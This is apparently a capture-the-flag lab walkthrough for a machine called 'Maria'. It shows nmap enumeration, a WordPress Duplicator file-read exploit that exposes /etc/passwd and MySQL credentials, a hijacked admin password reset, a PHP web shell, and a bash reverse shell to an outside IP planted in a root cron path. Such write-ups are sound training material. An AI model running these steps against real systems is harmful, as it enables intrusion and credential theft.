# Maria

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 -Pn 192.168.243.167
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-17 21:28 +08
Nmap scan report for 192.168.243.167
Host is up (0.17s latency).
Not shown: 65520 filtered tcp ports (no-response)
PORT      STATE  SERVICE
21/tcp    open   ftp
22/tcp    open   ssh
80/tcp    open   http
3306/tcp  open   mysql
```

Did a detailed scan too:

```
$ nmap -p 21,22,80,3306 -sC -sV --min-rate 3000 -Pn 192.168.243.167 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-17 21:30 +08
Nmap scan report for 192.168.243.167
Host is up (0.18s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    5 0        0            4096 Sep 21  2018 automysqlbackup
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.45.231
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74ba2023899262029fe73d3b83d4d96c (RSA)
|   256 548f79555ab03a695ad5723964fd074e (ECDSA)
|_  256 7f5d102762ba75e9bcc84fe27287d4e2 (ED25519)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Maria
|_http-server-header: Apache/2.4.38 (Debian)
|_http-generator: WordPress 5.7.1
3306/tcp open  mysql   MySQL 5.5.5-10.3.27-MariaDB-0+deb10u1
```

So port 21 has a file anonymous access, while port 80 is running Wordpress.&#x20;

### FTP Anonymous Creds

We can first enumerate this:

```
$ ftp 192.168.243.167
Connected to 192.168.243.167.
220 (vsFTPd 3.0.3)
Name (192.168.243.167:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
lsftp> ls
229 Entering Extended Passive Mode (|||10090|)
150 Here comes the directory listing.
drwxr-xr-x    5 0        0            4096 Sep 21  2018 automysqlbackup
226 Directory send OK.
ftp> cd automysqlbackup
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||10096|)
150 Here comes the directory listing.
drwxr-xr-x    5 0        0            4096 Sep 21  2018 etc
drwxr-xr-x    4 0        0            4096 Sep 21  2018 usr
drwxr-xr-x    3 0        0            4096 Sep 21  2018 var
```

The `/usr` directory contained a `automysqlbackup` script:

```
ftp> cd usr
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||10093|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Sep 21  2018 sbin
drwxr-xr-x    4 0        0            4096 Sep 21  2018 share
226 Directory send OK.
ftp> cd sbin
l250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||10090|)
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0           26047 Sep 21  2018 automysqlbackup
```

I cannot download this file, but we can take note of the directory its in. The `/etc` folder also contained one:

```
ftp> cd etc
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||10093|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Sep 21  2018 automysqlbackup
drwxr-xr-x    2 0        0            4096 Sep 21  2018 cron.daily
drwxr-xr-x    2 0        0            4096 Sep 21  2018 default
226 Directory send OK.
ftp> cd default
l250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||10093|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0            3442 Sep 21  2018 automysqlbackup
```

### Wordpress LFI --> SQL Creds

I ran an `nmap` script against Wordpress and it found this:

```
$ nmap --script http-wordpress-enum -p 80 192.168.243.167
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-17 21:35 +08
Nmap scan report for 192.168.243.167
Host is up (0.22s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-wordpress-enum: 
| Search limited to top 100 themes/plugins
|   plugins
|     akismet
|_    duplicator 1.3.26
```

For some reason `wpscan` doesn't pick up on these. Anyways, this version of Duplicator is vulnerable to an LFI.&#x20;

```
$ searchsploit duplicator 1.3.26
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read                                                                                  | php/webapps/50420.py
Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read (Metasploit)                                                                     | php/webapps/49288.rb
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

It works!

```
$ python3 50420.py http://192.168.243.167 /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ftp:x:106:113:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
mysql:x:107:114:MySQL Server,,,:/nonexistent:/bin/false
Debian-exim:x:108:115::/var/spool/exim4:/usr/sbin/nologin
joseph:x:1000:1000::/home/joseph:/bin/sh
```

From this, we can read the `automysqlbackup` file. It turns out to be a very long `bash` script with a lot of irrelevant stuff. We can read the `/etc/default/automysqlbackup` file to find some credentials:

```
$ python3 50420.py http://192.168.243.167 /etc/default/automysqlbackup
# Username to access the MySQL server e.g. dbuser
USERNAME=backup

# Username to access the MySQL server e.g. password
PASSWORD=EverydayAndEverynight420

# Host name (or IP address) of MySQL server e.g localhost
DBHOST=localhost
```

With this, we can login to the MySQL instance.

### MySQL Enum --> WP Plugins --> Reset Mail

```
$ mysql -h 192.168.243.167 -u backup -pEverydayAndEverynight420
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 131
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| wordpress          |
+--------------------+
2 rows in set (0.180 sec)
```

Let's enumerate `wordpress` and get the administrator hash:

```
MariaDB [wordpress]> select * from wp_users;
+----+------------+------------------------------------+---------------+-----------------+--------------------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email      | user_url           | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+-----------------+--------------------+---------------------+---------------------+-------------+--------------+
|  1 | admin      | $P$BQRpFYXVT4fNnin4CFuOiqUHRWchS40 | admin         | joseph@maria.pg | http://example.com | 2021-05-19 15:14:10 |                     |           0 | admin        |
+----+------------+------------------------------------+---------------+-----------------+--------------------+---------------------+---------------------+-------------+--------------+
```

However, this hash was unable to be cracked. I also could not overwrite it in anyway. I tried to reset the password of the `admin` user, but I could not get the confirmation link:

<figure><img src="../../../.gitbook/assets/image (3479).png" alt=""><figcaption></figcaption></figure>

Seems like the only way to exploit this is to somehow capture that reset link. Within the `wp_options` table, I found another active plugin:

{% code overflow="wrap" %}
```
|        33 | active_plugins                      | a:2:{i:0;s:25:"duplicator/duplicator.php";i:1;s:29:"easy-wp-smtp/easy-wp-smtp.php";}
```
{% endcode %}

It seems that `easy-wp-smtp.php` is also enabled. And within the `swpsmtp_options` part of the options, we can find a directory present:

{% code overflow="wrap" %}
```
|       132 | swpsmtp_options                     | a:10:{s:15:"from_name_field";s:5:"admin";s:23:"force_from_name_replace";b:0;s:8:"sub_mode";b:0;s:16:"from_email_field";s:13:"root@maria.pg";s:14:"reply_to_email";s:0:"";s:9:"bcc_email";s:0:"";s:17:"email_ignore_list";s:0:"";s:13:"smtp_settings";a:10:{s:4:"host";s:8:"maria.pg";s:15:"type_encryption";s:4:"none";s:13:"autentication";s:2:"no";s:8:"username";s:0:"";s:12:"enable_debug";i:1;s:12:"insecure_ssl";b:0;s:12:"encrypt_pass";b:0;s:8:"password";s:0:"";s:4:"port";s:2:"25";s:13:"log_file_name";s:27:"64b54599c2218_debug_log.txt";}s:19:"enable_domain_check";b:0;s:15:"allowed_domains";s:0:"";}
```
{% endcode %}

This file is located at `/wp-content/plugins/easy-wp-smtp/`, and from it we can get the password reset link:

<figure><img src="../../../.gitbook/assets/image (822).png" alt=""><figcaption></figcaption></figure>

Once visited, we can reset the password of the `admin` and login:

<figure><img src="../../../.gitbook/assets/image (3480).png" alt=""><figcaption></figcaption></figure>

The exploit path to getting RCE from Wordpress is the same. (Appearance > Theme Editor > Replace 404.php with a PHP Web shell > Profit).

<figure><img src="../../../.gitbook/assets/image (3975).png" alt=""><figcaption></figcaption></figure>

> I reset the box here, so the IP addresses are different.

From here, we can easily get a reverse shell.

<figure><img src="../../../.gitbook/assets/image (3489).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Cronjob --> Binary Hijack

I ran `pspy64` to enumerate the processes that were being run, and it found this:

```
2023/07/17 13:03:02 CMD: UID=0    PID=7830   | /bin/bash /usr/sbin/automysqlbackup 
2023/07/17 13:03:02 CMD: UID=0    PID=7829   | /bin/bash /usr/sbin/automysqlbackup 
2023/07/17 13:03:02 CMD: UID=0    PID=7831   | mail -s MySQL Backup Log for maria - 2023-07-17_13h03m root
```

I tried running the `automysqlbackup`, but it resulted in loads of errors. Within the errors, I saw this:

```
$ /usr/sbin/automysqlbackup
<TRUNCATED>
/usr/sbin/automysqlbackup: line 656: /var/www/html/wordpress/backup_scripts/backup-post: No such file or directory
<TRUNCATED>
```

Seems that `backup-post` is a binary run that is not present within a directory that we have write access to. We can easily create a reverse shell like this:

```bash
#!/bin/bash

bash -i >& /dev/tcp/192.168.45.162/80 0>&1
```

Then we can place this within the `/var/www/html/wordpress/backup_scripts` directory as `backup-post` after running `chmod 777` on it. We would get a reverse shell as `root` after waiting for a bit:

<figure><img src="../../../.gitbook/assets/image (2170).png" alt=""><figcaption></figcaption></figure>
